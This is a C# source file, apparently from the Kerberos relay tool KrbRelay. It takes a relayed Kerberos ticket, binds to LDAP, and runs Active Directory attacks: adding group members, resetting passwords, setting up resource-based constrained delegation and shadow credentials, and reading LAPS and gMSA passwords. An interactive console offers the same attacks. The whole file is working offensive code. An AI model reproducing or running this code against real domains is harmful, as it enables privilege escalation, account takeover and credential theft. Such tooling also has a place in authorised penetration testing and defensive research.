using System;
using System.Linq;
using System.Runtime.InteropServices;

namespace KrbRelay.Clients
{
    public class Ldap
    {
        public static void Connect()
        {
            // create berval struct with the kerberos ticket

            var buffer = new SecurityBuffer(State.ticket);
            var berval = new berval { bv_len = buffer.Count, bv_val = buffer.Token };

            var bervalPtr = Marshal.AllocHGlobal(Marshal.SizeOf(berval));
            Marshal.StructureToPtr(berval, bervalPtr, false);

            var bind = Interop.ldap_sasl_bind(
                State.ld,
                "",
                "GSS-SPNEGO", // GSS-SPNEGO / GSSAPI
                bervalPtr,
                IntPtr.Zero,
                IntPtr.Zero,
                out IntPtr servresp
            );

            Console.WriteLine("[*] bind: {0}", bind);

            Interop.ldap_get_option(State.ld, 0x0031, out int value);
            Console.WriteLine("[*] ldap_get_option: {0}", (LdapStatus)value);

            if ((LdapStatus)value == LdapStatus.Success)
            {
                Console.WriteLine("[+] LDAP session established");

                try
                {
                    if (State.attacks.Keys.Contains("console"))
                    {
                        ldapConsole(State.ld, State.attacks["console"]);
                    }
                    if (State.attacks.Keys.Contains("add-groupmember"))
                    {
                        string arg1 = State.attacks["add-groupmember"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = State.attacks["add-groupmember"].Split(new[] { ' ' }, 2)[1];
                        Attacks.Ldap.AddGroupMember.attack(State.ld, arg1, arg2);
                    }
                    if (State.attacks.Keys.Contains("reset-password"))
                    {
                        string arg1 = State.attacks["reset-password"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = State.attacks["reset-password"].Split(new[] { ' ' }, 2)[1];
                        Attacks.Ldap.setPassword.attack(State.ld, arg1, arg2);
                    }
                    if (State.attacks.Keys.Contains("rbcd"))
                    {
                        string arg1 = State.attacks["rbcd"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = State.attacks["rbcd"].Split(new[] { ' ' }, 2)[1];
                        Attacks.Ldap.RBCD.attack(State.ld, arg1, arg2);
                    }
                    if (State.attacks.Keys.Contains("shadowcred"))
                    {
                        string arg1 = State.relayedUser;
                        if (!string.IsNullOrEmpty(State.attacks["shadowcred"]))
                            arg1 = State.attacks["shadowcred"];

                        Attacks.Ldap.ShadowCredential.attack(State.ld, arg1);
                    }
                    if (State.attacks.Keys.Contains("laps"))
                    {
                        Attacks.Ldap.LAPS.read(State.ld, State.attacks["laps"]);
                    }
                    if (State.attacks.Keys.Contains("gmsa"))
                    {
                        Attacks.Ldap.gMSA.read(State.ld, State.attacks["gmsa"]);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                Interop.ldap_unbind(State.ld);
            }
            if ((LdapStatus)value != LdapStatus.SaslBindInProgress)
            {
                Console.WriteLine("[-] Ldap failed");
            }
            else
            {
                // get first ap_rep from ldap
                berval msgidp2 = (berval)Marshal.PtrToStructure(servresp, typeof(berval));
                byte[] msgidbytes = new byte[msgidp2.bv_len];
                Marshal.Copy(msgidp2.bv_val, msgidbytes, 0, msgidp2.bv_len);
                State.UpdateApRep1(msgidbytes);
            }
        }

        public static void ldapConsole(IntPtr ld, string optional = "")
        {
            bool exit = false;
            try
            {
                while (true)
                {
                    Console.Write("LDAP> ");
                    string input = Console.ReadLine();
                    string cmd = input.Split(' ')[0];
                    string arg1 = "";
                    string arg2 = "";
                    try
                    {
                        arg1 = input.Split(' ')[1];
                        arg2 = input.Split(' ')[2];
                    }
                    catch { }
                    switch (cmd)
                    {
                        case "user":
                            break;

                        case "computer":
                            break;

                        case "group":
                            break;

                        case "reset-password":
                            Attacks.Ldap.setPassword.attack(ld, arg1, arg2);
                            break;

                        case "add-groupmember":
                            Attacks.Ldap.addGroupMember.attack(ld, arg1, arg2);
                            break;

                        case "add-acl":
                            break;

                        case "rm-acl":
                            break;

                        case "shadowcred":
                            if (string.IsNullOrEmpty(arg1))
                            {
                                Console.WriteLine("[-] shadowcred requires an argument");
                                break;
                            }
                            Attacks.Ldap.ShadowCredential.attack(ld, arg1);
                            break;

                        case "rbcd":
                            if (string.IsNullOrEmpty(arg1) || string.IsNullOrEmpty(arg2))
                            {
                                Console.WriteLine("[-] rbcd requires two arguments");
                                break;
                            }
                            Attacks.Ldap.RBCD.attack(ld, arg1, arg2);
                            break;

                        case "laps":
                            Attacks.Ldap.LAPS.read(ld, arg1);
                            break;

                        case "gmsa":
                            Attacks.Ldap.gMSA.read(ld, arg1);
                            break;

                        case "exit":
                            exit = true;
                            break;

                        default:
                            Console.WriteLine(
                                "Commands:\n" +
                                //"user <user>          - List user attributes\n" +
                                //"group <group>        - List group attributes\n" +
                                //"computer <computer>  - List computer attributes\n" +
                                "shadowcred  <TARGET>              - Configure msDS-KeyCredentialLink \n" +
                                "rbcd  <SID> <TARGET>              - Configure RBCD\n" +
                                "reset-password  <user> <password> - Reset user password\n" +
                                "add-groupmember <group> <user>    - Add member to group\n" +
                                "laps                              - Read LAPS\n" +
                                "gmsa                              - Read gMSA\n" +
                                //"rm-groupmember  <group> <user>    - Remove member from group\n" +
                                "exit\n");
                            break;
                    }
                    if (exit)
                    {
                        break;
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
